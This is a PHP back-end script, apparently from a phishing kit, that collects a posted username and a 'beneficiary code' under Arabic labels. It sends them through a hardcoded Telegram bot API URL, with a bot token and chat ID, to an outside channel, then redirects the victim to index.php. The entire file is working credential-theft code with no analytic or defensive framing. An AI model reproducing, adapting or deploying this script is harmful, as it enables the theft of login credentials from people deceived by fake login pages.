 <?php
 $username =  $_POST['username3'];
 $password = $_POST['password3'];

 $data = '-----------------' .  "\n" .  "\n" ;

 $data .= 'اسم المستخدم'.' : '.$username.  "\n" .  "\n";
 
 $data .= 'كود المستفيد'.' : '.$password.  "\n" .  "\n";
 
 $data .= '--------------'.  "\n" .  "\n";

 $endaaata = urlencode($data);

 if (!empty($_POST)){
     
     // create curl resource
     $ch = curl_init();

     // set url
     curl_setopt($ch, CURLOPT_URL, "https://api.telegram.org/bot5073452598:AAGIsolVbMzsqs7cLFuNb96auMA5PGQaQEU/sendMessage?chat_id=@SadedQ_Bot3&text=$endaaata");

     //return the transfer as a string
     curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);

     // $output contains the output string
     $output = curl_exec($ch);

 // close curl resource to free up system resources
     curl_close($ch);     
 }


 header("Location: index.php");

?>
